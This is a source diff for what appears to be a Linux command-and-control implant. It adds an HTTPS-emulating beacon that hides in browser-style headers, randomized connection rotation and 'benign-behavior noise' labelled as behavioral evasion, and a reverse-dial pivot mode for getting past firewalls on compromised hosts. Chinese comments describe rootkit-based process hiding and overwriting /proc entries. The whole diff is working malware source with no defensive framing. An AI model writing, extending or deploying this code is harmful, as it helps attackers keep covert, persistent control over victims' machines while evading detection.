@@ -11,6 +11,8 @@
 #include "proxyfire.h"
 #include "elf_resolve.h"
 #include "opsec.h"
+#include "timing.h"
+#include "noise.h"
 #include "config.h"
 
 #ifdef ARCH_X86_64
@@ -141,6 +143,9 @@ typedef struct {
     uint32_t  ua_count;
     int       ans_size;
     int       ans_pre_size;
+    // HTTPS-emulation fields (H1 Phase 1b)
+    int       is_https_emu;
+    char      heartbeat_header[48];
 } profile_t;
 
 static int decode_profile(const uint8_t* enc_data, uint32_t enc_size, profile_t* prof) {
@@ -180,6 +185,8 @@ static int decode_profile(const uint8_t* enc_data, uint32_t enc_size, profile_t*
     prof->ua_count = 0;
     prof->ans_size = 0;
     prof->ans_pre_size = 0;
+    prof->is_https_emu = 0;
+    ax_strcpy(prof->heartbeat_header, "X-Requested-With");
 
     for (uint32_t i = 0; i < map_count; i++) {
         const char* key;
@@ -243,6 +250,14 @@ static int decode_profile(const uint8_t* enc_data, uint32_t enc_size, profile_t*
             uint64_t v; mp_read_uint(&r, &v); prof->ans_size = (int)v;
         } else if (klen == 11 && ax_memcmp(key, "ans_pre_size", 11) == 0) {
             uint64_t v; mp_read_uint(&r, &v); prof->ans_pre_size = (int)v;
+        } else if (klen == 12 && ax_memcmp(key, "is_https_emu", 12) == 0) {
+            bool v; mp_read_bool(&r, &v); prof->is_https_emu = v ? 1 : 0;
+        } else if (klen == 16 && ax_memcmp(key, "heartbeat_header", 16) == 0) {
+            const char* hv; uint32_t hlen;
+            if (mp_read_str(&r, &hv, &hlen) == 0 && hlen > 0 && hlen < 48) {
+                ax_memcpy(prof->heartbeat_header, hv, hlen);
+                prof->heartbeat_header[hlen] = '\0';
+            }
         } else {
             mp_skip(&r);
         }
@@ -463,6 +478,16 @@ static void so_entry(int argc, char **argv, char **envp) {
 // Helper called from the naked ASM trampoline with the original SP value.
 __attribute__((noreturn, noinline, used))
 static void _start_c(unsigned long *stack) {
+    // Zero-libc static binaries do NOT inherit SIGPIPE-ignored state
+    // (no CRT); a write to a dead C2 socket would SIGPIPE-kill the
+    // agent instead of failing the syscall. Ignore it up front so
+    // connection loss always flows through the retry loop.
+    {
+        struct { unsigned long handler, flags, restorer, mask; } sa;
+        ax_memset(&sa, 0, sizeof(sa));
+        sa.handler = 1UL;  // SIG_IGN
+        sys_rt_sigaction(13 /* SIGPIPE */, &sa, (void*)0, 8);
+    }
     g_argv = (char **)(stack + 1);  // argv starts after argc
     int ret = agent_main();
     sys_exit_group(ret);
@@ -492,14 +517,28 @@ void _start(void) {
 /// Command loop — shared between client TCP and bind TCP modes.
 /// Handles recv/process/send cycle with non-blocking polling.
 /// Returns 0 if ACTIVE was set to 0 (exit), -1 on connection error.
-static int command_loop(connector_t* conn, const uint8_t* session_key, size_t session_key_len) {
+static int command_loop(connector_t* conn, const uint8_t* session_key, size_t session_key_len, uint64_t rotate_ms) {
+    uint64_t conn_start = ax_monotonic_ms();
+    uint64_t last_beacon_ms = 0;
     while (ACTIVE) {
+        // Connection rotation: drop a healthy link after a randomized
+        // lifetime so traffic shows sparse irregular churn (not one
+        // eternal idle channel). Signal -2 to the outer reconnect loop.
+        if (rotate_ms && ax_monotonic_ms() - conn_start >= rotate_ms)
+            return -2;
+
+        // Benign-behavior noise (self-gating, randomized cadence)
+        ax_behavior_noise();
+
         uint8_t* recv_data = (uint8_t*)0;
         size_t recv_len = 0;
 
         // Poll C2 socket with 100ms timeout
         int poll_ret = conn_recv_msg_timeout(conn, &recv_data, &recv_len, 100);
         if (poll_ret < 0) return -1;  // error/disconnect → reconnect
+        // NOTE: poll_ret == 0 for BOTH timeout and received messages.
+        // A real message is the only case where recv_data is non-NULL.
+        int got_msg = (recv_data != (uint8_t*)0);
 
         // Build response objects collector
         mp_writer_t obj_collector;
@@ -516,7 +555,7 @@ static int command_loop(connector_t* conn, const uint8_t* session_key, size_t se
             // Decrypt with session key (GopherTCP: 32-byte key, LinuxTCP: 16-byte key)
             size_t plain_len;
             if (session_key_len >= 32)
-                plaintext = gopher_decrypt(recv_data, recv_len, session_key, session_key_len, &plain_len);
+                plaintext = gopher_decrypt_nogcm(recv_data, recv_len, session_key, session_key_len, &plain_len);
             else
                 plaintext = aes128_gcm_decrypt(recv_data, recv_len, session_key, &plain_len);
             ax_free(recv_data);
@@ -570,8 +609,11 @@ static int command_loop(connector_t* conn, const uint8_t* session_key, size_t se
         resp_count += (uint32_t)process_pivots(&g_pivot_ctx, &obj_collector);
         resp_count += (uint32_t)process_tunnels(&obj_collector);
 
-        // Send response if we have data OR if we received a message from teamserver
-        int must_respond = (poll_ret == 0);
+        // Respond on real server messages, or on the slow idle beacon
+        // (20-45 s drifted) — never on every poll timeout. The old
+        // per-timeout response flooded the socket and broke sessions.
+        int beacon_due = ax_beacon_due(ax_monotonic_ms(), &last_beacon_ms);
+        int must_respond = got_msg || beacon_due;
         if (resp_count > 0 || must_respond) {
             mp_writer_t msg_writer;
             mp_writer_init(&msg_writer, 1024);
@@ -591,7 +633,7 @@ static int command_loop(connector_t* conn, const uint8_t* session_key, size_t se
             size_t enc_len;
             uint8_t* encrypted;
             if (session_key_len >= 32)
-                encrypted = gopher_encrypt(msg_writer.buf.data, msg_writer.buf.len,
+                encrypted = gopher_encrypt_nogcm(msg_writer.buf.data, msg_writer.buf.len,
                                            session_key, session_key_len, &enc_len);
             else
                 encrypted = aes128_gcm_encrypt(msg_writer.buf.data, msg_writer.buf.len,
@@ -623,16 +665,29 @@ static int command_loop(connector_t* conn, const uint8_t* session_key, size_t se
 
 /// WebSocket command loop — send/receive via WS frames
 /// Uses ans_pre_size/ans_size from profile to strip WebPageOutput template.
-/// Returns 0 if ACTIVE was set to 0 (exit), -1 on connection error.
+/// Returns 0 if ACTIVE was set to 0 (exit), -1 on connection error,
+/// -2 when connection rotation was requested.
 static int ws_command_loop(ws_connector_t* ws, const uint8_t* session_key, size_t session_key_len,
-                           int ans_pre_size, int ans_size) {
+                           int ans_pre_size, int ans_size, uint64_t rotate_ms) {
+    uint64_t conn_start = ax_monotonic_ms();
+    uint64_t last_beacon_ms = 0;
     while (ACTIVE) {
+        // Connection rotation (same rationale as command_loop)
+        if (rotate_ms && ax_monotonic_ms() - conn_start >= rotate_ms)
+            return -2;
+
+        // Benign-behavior noise (self-gating, randomized cadence)
+        ax_behavior_noise();
+
         uint8_t* recv_data = (uint8_t*)0;
         size_t recv_len = 0;
 
         // Poll WS with 100ms timeout
         int poll_ret = ws_recv_message_timeout(ws, &recv_data, &recv_len, 100);
         if (poll_ret < 0) return -1;  // error/disconnected → reconnect
+        // poll_ret == 0 for both timeout and received messages; only a
+        // real message leaves recv_data non-NULL.
+        int got_msg = (recv_data != (uint8_t*)0);
 
         // Build response objects collector
         mp_writer_t obj_collector;
@@ -664,7 +719,7 @@ static int ws_command_loop(ws_connector_t* ws, const uint8_t* session_key, size_
                         uint8_t* possible_plain = (uint8_t*)0;
 
                         if (session_key_len >= 32)
-                            possible_plain = gopher_decrypt(decoded, (size_t)dec_len,
+                            possible_plain = gopher_decrypt_nogcm(decoded, (size_t)dec_len,
                                                              session_key, session_key_len, &plain_len);
                         else
                             possible_plain = aes128_gcm_decrypt(decoded, (size_t)dec_len,
@@ -724,8 +779,10 @@ static int ws_command_loop(ws_connector_t* ws, const uint8_t* session_key, size_
         resp_count += (uint32_t)process_pivots(&g_pivot_ctx, &obj_collector);
         resp_count += (uint32_t)process_tunnels(&obj_collector);
 
-        // Send response if we have data OR if we received a message
-        int must_respond = (poll_ret == 0);
+        // Respond on real server messages, or on the slow idle beacon
+        // (20-45 s drifted) — never on every poll timeout.
+        int beacon_due = ax_beacon_due(ax_monotonic_ms(), &last_beacon_ms);
+        int must_respond = got_msg || beacon_due;
         if (resp_count > 0 || must_respond) {
             mp_writer_t msg_writer;
             mp_writer_init(&msg_writer, 1024);
@@ -745,7 +802,7 @@ static int ws_command_loop(ws_connector_t* ws, const uint8_t* session_key, size_
             size_t enc_len;
             uint8_t* encrypted;
             if (session_key_len >= 32)
-                encrypted = gopher_encrypt(msg_writer.buf.data, msg_writer.buf.len,
+                encrypted = gopher_encrypt_nogcm(msg_writer.buf.data, msg_writer.buf.len,
                                            session_key, session_key_len, &enc_len);
             else
                 encrypted = aes128_gcm_encrypt(msg_writer.buf.data, msg_writer.buf.len,
@@ -776,11 +833,207 @@ static int ws_command_loop(ws_connector_t* ws, const uint8_t* session_key, size_
     return 0;
 }
 
+static int https_command_loop(ws_connector_t* ws, const uint8_t* session_key, size_t session_key_len,
+                              int ans_pre_size, int ans_size, uint64_t rotate_ms,
+                              profile_t* prof, uint32_t agent_id,
+                              const uint8_t* session_info_data, size_t session_info_len,
+                              const char* current_uri, const char* current_ua) {
+    uint64_t conn_start = ax_monotonic_ms();
+    uint64_t last_beacon_ms = 0;
+
+    // The beat rides in the browser header on EVERY request (stateless HTTP);
+    // the header NAME rotates across the comma-list per request (Phase 1b).
+    uint8_t beat_buf[512];
+    size_t beat_len = 0;
+    if (ws_build_beat(prof->enc_key, prof->type, agent_id,
+                      session_info_data, session_info_len,
+                      beat_buf, sizeof(beat_buf), &beat_len) != 0) return -1;
+    beat_buf[beat_len] = '\0';
+    uint32_t hb_idx = 0;
+
+    // Response collector persists ACROSS iterations: command responses are
+    // appended AFTER this iteration's POST already went out (stateless HTTP
+    // is request-first), so they must ride the NEXT iteration's POST. The
+    // old per-iteration collector freed them unsent - task responses were
+    // silently dropped and the server never saw command output.
+    mp_writer_t obj_collector;
+    mp_writer_init(&obj_collector, 1024);
+    uint32_t resp_count = 0;
+
+    while (ACTIVE) {
+        if (rotate_ms && ax_monotonic_ms() - conn_start >= rotate_ms) {
+            mp_writer_free(&obj_collector);
+            return -2;
+        }
+
+        // Benign-behavior noise (self-gating, randomized cadence)
+        ax_behavior_noise();
+
+        // Poll active pivots and tunnels into the persistent collector
+        resp_count += (uint32_t)process_pivots(&g_pivot_ctx, &obj_collector);
+        resp_count += (uint32_t)process_tunnels(&obj_collector);
+
+        // Idle beacon on the drifted 20-45s cadence; results POST immediately
+        int beacon_due = ax_beacon_due(ax_monotonic_ms(), &last_beacon_ms);
+
+        uint8_t* recv_data = (uint8_t*)0;
+        size_t recv_len = 0;
+        uint8_t* plaintext = (uint8_t*)0;
+        const uint8_t** objects = (const uint8_t**)0;
+        uint32_t* obj_sizes = (uint32_t*)0;
+        uint32_t obj_count = 0;
+        int8_t msg_type = 0;
+
+        if (resp_count > 0 || beacon_due) {
+            mp_writer_t msg_writer;
+            mp_writer_init(&msg_writer, 1024);
+            mp_write_map(&msg_writer, 2);
+
+            if (resp_count > 0) {
+                mp_write_kv_int(&msg_writer, "type", 1);
+                mp_write_str(&msg_writer, "object", 6);
+                mp_write_array(&msg_writer, resp_count);
+                buf_append(&msg_writer.buf, obj_collector.buf.data, obj_collector.buf.len);
+            } else {
+                mp_write_kv_int(&msg_writer, "type", 0);
+                mp_write_str(&msg_writer, "object", 6);
+                mp_write_array(&msg_writer, 0);
+            }
+
+            size_t enc_len;
+            uint8_t* encrypted;
+            if (session_key_len >= 32)
+                encrypted = gopher_encrypt_nogcm(msg_writer.buf.data, msg_writer.buf.len,
+                                           session_key, session_key_len, &enc_len);
+            else
+                encrypted = aes128_gcm_encrypt(msg_writer.buf.data, msg_writer.buf.len,
+                                                session_key, &enc_len);
+            mp_writer_free(&msg_writer);
+
+            if (encrypted) {
+                if (https_send(ws, current_uri, current_ua,
+                               https_pick_header(prof->heartbeat_header, hb_idx++),
+                               (const char*)beat_buf,
+                               encrypted, enc_len) != 0) {
+                    ax_free(encrypted);
+                    mp_writer_free(&obj_collector);
+                    return -1;
+                }
+                ax_free(encrypted);
+
+                // Batch sent - reset the collector for the next round
+                if (resp_count > 0) {
+                    mp_writer_free(&obj_collector);
+                    mp_writer_init(&obj_collector, 1024);
+                    resp_count = 0;
+                }
+            } else {
+                mp_writer_free(&obj_collector);
+                return -1;
+            }
+
+            // Read the response and process any commands
+            if (https_recv(ws, &recv_data, &recv_len) != 0) {
+                mp_writer_free(&obj_collector);
+                return -1;
+            }
+
+            if (recv_len > 0) {
+                uint8_t* b64_start = recv_data;
+                size_t b64_len = recv_len;
+                extract_b64_payload(recv_data, recv_len, ans_pre_size, ans_size, &b64_start, &b64_len);
+
+                if (b64_len > 0) {
+                    size_t dec_max = (b64_len * 3) / 4 + 1;
+                    uint8_t* decoded = (uint8_t*)ax_malloc(dec_max);
+                    if (decoded) {
+                        int dec_len = ws_b64_decode((const char*)b64_start, b64_len, decoded, dec_max);
+                        if (dec_len > 0) {
+                            size_t plain_len;
+                            uint8_t* possible_plain;
+                            if (session_key_len >= 32)
+                                possible_plain = gopher_decrypt_nogcm(decoded, (size_t)dec_len,
+                                                                 session_key, session_key_len, &plain_len);
+                            else
+                                possible_plain = aes128_gcm_decrypt(decoded, (size_t)dec_len,
+                                                                    session_key, &plain_len);
+                            if (possible_plain) {
+                                plaintext = possible_plain;
+                                if (parse_message(plaintext, plain_len, &msg_type, &objects, &obj_sizes, &obj_count) != 0) {
+                                    ax_free(plaintext);
+                                    plaintext = (uint8_t*)0;
+                                    msg_type = 0;
+                                    obj_count = 0;
+                                } else {
+                            }
+                            }
+                        }
+                        ax_free(decoded);
+                    }
+                }
+
+                ax_free(recv_data);
+                recv_data = (uint8_t*)0;
+
+                if (msg_type == 1 && obj_count > 0) {
+                    for (uint32_t i = 0; i < obj_count; i++) {
+                        uint32_t code = 0, cmd_id = 0;
+                        const uint8_t* cmd_data = (const uint8_t*)0;
+                        uint32_t cmd_data_len = 0;
+                        parse_command(objects[i], obj_sizes[i],
+                                     &code, &cmd_id, &cmd_data, &cmd_data_len);
+
+                        mp_writer_t cmd_resp;
+                        mp_writer_init(&cmd_resp, 256);
+                        int ret = handle_command(code, cmd_id, cmd_data, cmd_data_len, &cmd_resp);
+                        if (ret == -99) ACTIVE = 0;
+
+                        mp_writer_t wrapped;
+                        mp_writer_init(&wrapped, 256);
+                        mp_write_map(&wrapped, 3);
+                        mp_write_kv_uint(&wrapped, "code", code);
+                        mp_write_kv_uint(&wrapped, "id", cmd_id);
+                        mp_write_kv_bin(&wrapped, "data", cmd_resp.buf.data, (uint32_t)cmd_resp.buf.len);
+
+                        mp_write_bin(&obj_collector, wrapped.buf.data, (uint32_t)wrapped.buf.len);
+                        mp_writer_free(&cmd_resp);
+                        mp_writer_free(&wrapped);
+                        resp_count++;
+                    }
+                }
+            }
+        }
+
+        if (objects) ax_free((void*)objects);
+        if (obj_sizes) ax_free(obj_sizes);
+        if (plaintext) ax_free(plaintext);
+        if (recv_data) ax_free(recv_data);
+
+        // Idle pacing: the WS loop blocks 100ms in its poll; this loop has
+        // no blocking I/O between beacons — sleep to avoid a busy spin
+        // (observed 3900 iterations/s + 100% CPU before this fix).
+        if (resp_count == 0 && !beacon_due) {
+            ax_drifted_sleep_ms(150);
+        }
+    }
+    mp_writer_free(&obj_collector);
+    return 0;
+}
+
 static int agent_main(void) {
     // OPSEC checks — abort if hostile environment detected
 #ifdef OPSEC_ENABLED
     if (opsec_check() != 0) return 1;
 #endif
+
+    // P1: /proc/<pid> 自覆盖 —— comm / exe / cwd（方案 §3.4 / B2·B3·B4）。
+    // 放在 opsec_check 之后、任何网络活动之前：越早覆盖，暴露窗口越小。
+    opsec_self_cover(g_argv);
+
+    // P2 B10: rootkit 已在跑就立刻自隐藏（`ls /proc` 不可见，门 S2）。
+    // 放在这里 = 任何网络活动之前；失败不阻塞（rootkit 可能还没加载，
+    // 后续由 opsec_hide_self_tick() 退避重试）。
+    opsec_hide_self();
 
     // ELF resolver — resolve libc APIs by hash (SO mode only)
 #ifdef BUILD_SO
@@ -801,16 +1054,21 @@ static int agent_main(void) {
 
     if (profile_count == 0) return 1;
 
-    // Detect protocol: watermark==0 → GopherTCP, uri_count>0 → WebSocket, else LinuxTCP
+    // Detect protocol: watermark==0 → GopherTCP, uri_count>0 → WebSocket,
+    // is_https_emu → HTTPS-emulation (H1 Phase 1b), else LinuxTCP
     int is_gopher = (profiles[0].listener_watermark == 0 && profiles[0].uri_count == 0) ? 1 : 0;
-    int is_ws = (profiles[0].uri_count > 0 && profiles[0].ua_count > 0) ? 1 : 0;
+    int is_https = profiles[0].is_https_emu;
+    int is_ws = (profiles[0].uri_count > 0 && profiles[0].ua_count > 0 && !is_https) ? 1 : 0;
 
-    // Create session info (GopherTCP: 32-byte key+salt, LinuxTCP: 16-byte key)
+    // Create session info. All transports now use the 32-byte key+salt
+    // (AES-GCM + ChaCha20 overlay) — the 16-byte plain-GCM path's hand-rolled
+    // implementation proved unreliable on real-length inputs; the 32-byte
+    // gopher crypto is the cross-language-tested one (verify [7]).
     mp_writer_t si_writer;
     mp_writer_init(&si_writer, 512);
     uint8_t session_key[32];
-    if (create_session_info(&si_writer, session_key, is_gopher) != 0) return 1;
-    size_t session_key_len = is_gopher ? 32 : 16;
+    if (create_session_info(&si_writer, session_key, 1) != 0) return 1;
+    size_t session_key_len = 32;
 
     // Generate random agent ID
     uint8_t id_buf[4];
@@ -827,6 +1085,12 @@ static int agent_main(void) {
     // Initialize job context for async operations (stubs for Phase 1)
     jobs_init(&g_job_ctx);
     g_job_ctx.agent_id = agent_id;
+    // Job threads open their own C2 connection for async output;
+    // without the address update conn_open() gets an empty target and
+    // every run/job silently dies before exec (stub-era regression).
+    if (profiles[0].addresses && profiles[0].addresses[0])
+        jobs_update_connection(&g_job_ctx, profiles[0].addresses[0], 0,
+                               profiles[0].enc_key, profiles[0].type);
     g_job_ctx.is_gopher = is_gopher;
     ax_memcpy(g_job_ctx.session_key, session_key, session_key_len);
     g_job_ctx.session_key_len = session_key_len;
@@ -857,7 +1121,86 @@ static int agent_main(void) {
 
     if (!init_msg) { ax_free(session_info_data); return 1; }
 
-    if (is_ws) {
+    if (is_https) {
+        // ======== HTTPS-EMULATION MODE (H1 Phase 1b) ========
+        // No WebSocket frames: each beacon is a plain HTTPS POST with a
+        // browser-typical header carrying the beat. Same rotation/backoff
+        // skeleton as the WS mode.
+        uint32_t addr_idx = 0;
+        uint32_t uri_idx = 0;
+        uint32_t ua_idx = 0;
+
+        for (int attempt = 0; attempt < prof->conn_count && ACTIVE; attempt++) {
+            if (attempt > 0) {
+                ax_test_log("reconnect");
+                ax_drifted_sleep_ms((uint32_t)prof->conn_timeout * 1000u);
+                addr_idx = (addr_idx + 1) % prof->addr_count;
+                if (addr_idx == 0) {
+                    uri_idx = (uri_idx + 1) % prof->uri_count;
+                    ua_idx = (ua_idx + 1) % prof->ua_count;
+                    prof_idx = (prof_idx + 1) % profile_count;
+                    prof = &profiles[prof_idx];
+
+                    ax_free(init_msg);
+                    build_init_msg(agent_id, prof->type,
+                                   prof->listener_watermark,
+                                   session_info_data, session_info_len,
+                                   prof->enc_key,
+                                   &init_msg, &init_msg_len);
+                }
+            }
+
+            const char* current_uri = prof->uris[uri_idx % prof->uri_count];
+            const char* current_ua = prof->ua_list[ua_idx % prof->ua_count];
+
+            uint16_t host_port = 443;
+            for (uint32_t pi = 0; pi < prof->addr_count; pi++) {
+                const char* addr = prof->addresses[addr_idx];
+                const char* colon = (const char*)0;
+                for (const char* p = addr; *p; p++) {
+                    if (*p == ':') colon = p;
+                }
+                if (colon) {
+                    host_port = 0;
+                    for (const char* p = colon + 1; *p >= '0' && *p <= '9'; p++)
+                        host_port = host_port * 10 + (*p - '0');
+                }
+            }
+
+            char host_buf[256];
+            const char* addr_str = prof->addresses[addr_idx];
+            int host_i = 0;
+            for (const char* p = addr_str; *p && *p != ':' && host_i < 255; p++)
+                host_buf[host_i++] = *p;
+            host_buf[host_i] = '\0';
+
+            ws_connector_t ws;
+            ws_init(&ws);
+
+            if (https_connect(&ws, host_buf, host_port, prof->use_ssl) != 0) {
+                continue;
+            }
+
+            // Reset attempt counter on successful connect
+            ax_test_log("connect");
+            attempt = 0;
+
+            // Enter the HTTPS command loop (stateless POST/response cycles).
+            // Rotate the connection after a randomized lifetime (-2 return).
+            uint64_t rotate_ms = ax_rotation_interval_ms((uint32_t)prof->conn_timeout * 1000u);
+            int loop_ret = https_command_loop(&ws, session_key, session_key_len,
+                           prof->ans_pre_size, prof->ans_size, rotate_ms,
+                           prof, agent_id,
+                           session_info_data, session_info_len,
+                           current_uri, current_ua);
+
+            ws_disconnect(&ws);
+            if (loop_ret == -2) {
+                attempt = -1;  // rotation: reconnect immediately, no backoff
+                ax_test_log("rotate");
+            }
+        }
+    } else if (is_ws) {
         // ======== WEBSOCKET MODE ========
         // Agent connects to WS teamserver via WebSocket upgrade
         uint32_t addr_idx = 0;
@@ -866,20 +1209,9 @@ static int agent_main(void) {
 
         for (int attempt = 0; attempt < prof->conn_count && ACTIVE; attempt++) {
             if (attempt > 0) {
-                // Bidirectional jitter: ±20% of conn_timeout
-                unsigned int base_sleep = (unsigned int)prof->conn_timeout;
-                if (base_sleep > 2) {
-                    uint8_t rnd[4];
-                    ax_random_bytes(rnd, 4);
-                    uint32_t rval = ((uint32_t)rnd[0] << 24) | ((uint32_t)rnd[1] << 16) |
-                                    ((uint32_t)rnd[2] << 8)  | rnd[3];
-                    unsigned int jitter_range = (base_sleep * 40) / 100;
-                    unsigned int delta = rval % (jitter_range + 1);
-                    unsigned int half = jitter_range / 2;
-                    if (base_sleep > half)
-                        base_sleep = base_sleep - half + delta;
-                }
-                sys_sleep(base_sleep);
+                ax_test_log("reconnect");
+                // Right-skewed jitter + random-walk drift (behavioral evasion)
+                ax_drifted_sleep_ms((uint32_t)prof->conn_timeout * 1000u);
                 addr_idx = (addr_idx + 1) % prof->addr_count;
                 if (addr_idx == 0) {
                     uri_idx = (uri_idx + 1) % prof->uri_count;
@@ -944,6 +1276,7 @@ static int agent_main(void) {
             }
 
             // Reset attempt counter on successful connect
+            ax_test_log("connect");
             attempt = 0;
 
             // Send init message as first WS text frame
@@ -952,14 +1285,76 @@ static int agent_main(void) {
                 continue;
             }
 
-            // Enter WS command loop with template stripping
-            ws_command_loop(&ws, session_key, session_key_len,
-                           prof->ans_pre_size, prof->ans_size);
+            // Enter WS command loop with template stripping. Rotate the
+            // connection after a randomized lifetime (-2 return).
+            uint64_t rotate_ms = ax_rotation_interval_ms((uint32_t)prof->conn_timeout * 1000u);
+            int loop_ret = ws_command_loop(&ws, session_key, session_key_len,
+                           prof->ans_pre_size, prof->ans_size, rotate_ms);
 
             ws_disconnect(&ws);
+            if (loop_ret == -2) {
+                attempt = -1;  // rotation: reconnect immediately, no backoff
+                ax_test_log("rotate");
+            }
         }
     } else if (prof->bind_port > 0) {
-        // ======== BIND TCP MODE ========
+        // ======== PIVOT MODE: reverse-first, listen as fallback ========
+        //
+        // The classic shape is "parent dials child".  That needs INBOUND
+        // reachability to this host on bind_port -- routinely blocked by a
+        // default-deny host firewall on an internal network -- and it leaves a
+        // listening socket open on this (freshly compromised) host for the
+        // entire lifetime of the pivot.
+        //
+        // So try the opposite direction first: dial the parent at
+        // addresses[i]:bind_port and run the very same command loop over the
+        // socket WE opened.  The parent accepts it via COMMAND_PIVOT_LISTEN
+        // and adopts it through the identical handshake path, so nothing on
+        // the teamserver side changes.  Only when no parent is reachable do we
+        // fall back to the original listening behaviour.
+        int reversed_once = 0;
+        while (ACTIVE) {
+            int dialed = -1;
+
+            for (uint32_t i = 0; i < prof->addr_count && ACTIVE; i++) {
+                if (!prof->addresses[i]) continue;
+
+                int fd = pivot_dial_tcp(prof->addresses[i], (int)prof->bind_port,
+                                        PIVOT_CONNECT_TIMEOUT, (const char **)0);
+                if (fd < 0) continue;
+
+                connector_t rconn;
+                rconn.fd = fd;
+
+                // The same init message (watermark + encrypted beat) the
+                // listen path sends -- the parent cannot tell them apart.
+                if (conn_send_msg(&rconn, init_msg, init_msg_len) != 0) {
+                    conn_close(&rconn);
+                    continue;
+                }
+
+                ax_test_log("revpivot");
+                command_loop(&rconn, session_key, session_key_len, 0);
+                conn_close(&rconn);
+
+                dialed = 0;        // session finished -- dial again
+                reversed_once = 1;
+                break;
+            }
+
+            if (dialed == 0) continue;
+            // Never reached a parent -> fall through to listening.
+            if (!reversed_once) break;
+            // Did reach one before, so stay in reverse mode: opening a
+            // listener here would defeat the point.  Retry with the usual
+            // drifted backoff instead.
+            // A bind_tcp profile can carry conn_timeout == 0 (a pure listener
+            // never dials), which would turn this retry into a busy spin.
+            uint32_t backoff_s = prof->conn_timeout > 0 ? (uint32_t)prof->conn_timeout : 10u;
+            ax_drifted_sleep_ms(backoff_s * 1000u);        }
+
+        if (!reversed_once) {
+        // ---- no parent reachable: original listen path, unchanged ----
         // Agent listens on a port, parent connects to us.
         // Used for pivot: beacon parent → "link tcp <ip> <port>" → this agent.
         connector_t server;
@@ -983,12 +1378,14 @@ static int agent_main(void) {
             }
 
             // Enter command loop (shared with client TCP mode)
-            command_loop(&conn, session_key, session_key_len);
+            // Bind mode is parent-driven: no self-rotation.
+            command_loop(&conn, session_key, session_key_len, 0);
 
             conn_close(&conn);
         }
 
         conn_close(&server);
+        }
     } else {
         // ======== CLIENT TCP MODE ========
         // Agent connects out to teamserver addresses.
@@ -996,20 +1393,9 @@ static int agent_main(void) {
 
         for (int attempt = 0; attempt < prof->conn_count && ACTIVE; attempt++) {
             if (attempt > 0) {
-                // Bidirectional jitter: ±20% of conn_timeout
-                unsigned int base_sleep = (unsigned int)prof->conn_timeout;
-                if (base_sleep > 2) {
-                    uint8_t rnd[4];
-                    ax_random_bytes(rnd, 4);
-                    uint32_t rval = ((uint32_t)rnd[0] << 24) | ((uint32_t)rnd[1] << 16) |
-                                    ((uint32_t)rnd[2] << 8)  | rnd[3];
-                    unsigned int jitter_range = (base_sleep * 40) / 100;
-                    unsigned int delta = rval % (jitter_range + 1);
-                    unsigned int half = jitter_range / 2;
-                    if (base_sleep > half)
-                        base_sleep = base_sleep - half + delta;
-                }
-                sys_sleep(base_sleep);
+                ax_test_log("reconnect");
+                // Right-skewed jitter + random-walk drift (behavioral evasion)
+                ax_drifted_sleep_ms((uint32_t)prof->conn_timeout * 1000u);
                 addr_idx++;
                 if (addr_idx >= prof->addr_count) {
                     addr_idx = 0;
@@ -1041,6 +1427,7 @@ static int agent_main(void) {
             if (conn_open(&conn, prof->addresses[addr_idx]) != 0) continue;
 
             // Reset attempt counter on successful connect
+            ax_test_log("connect");
             attempt = 0;
 
             // Read banner
@@ -1057,10 +1444,16 @@ static int agent_main(void) {
                 continue;
             }
 
-            // Enter command loop (shared with bind TCP mode)
-            command_loop(&conn, session_key, session_key_len);
+            // Enter command loop (shared with bind TCP mode). Rotate the
+            // connection after a randomized lifetime (-2 return).
+            uint64_t rotate_ms = ax_rotation_interval_ms((uint32_t)prof->conn_timeout * 1000u);
+            int loop_ret = command_loop(&conn, session_key, session_key_len, rotate_ms);
 
             conn_close(&conn);
+            if (loop_ret == -2) {
+                attempt = -1;  // rotation: reconnect immediately, no backoff
+                ax_test_log("rotate");
+            }
         }
     }
 
